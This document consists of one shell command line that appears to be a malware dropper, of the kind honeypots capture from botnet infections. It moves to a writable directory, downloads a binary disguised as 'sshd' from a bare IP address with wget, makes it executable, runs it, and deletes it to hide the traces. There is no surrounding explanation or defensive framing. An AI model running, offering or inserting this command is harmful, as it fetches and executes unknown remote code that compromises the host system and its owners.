cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.71.9/sshd; chmod +x sshd; ./sshd; rm -rf sshd
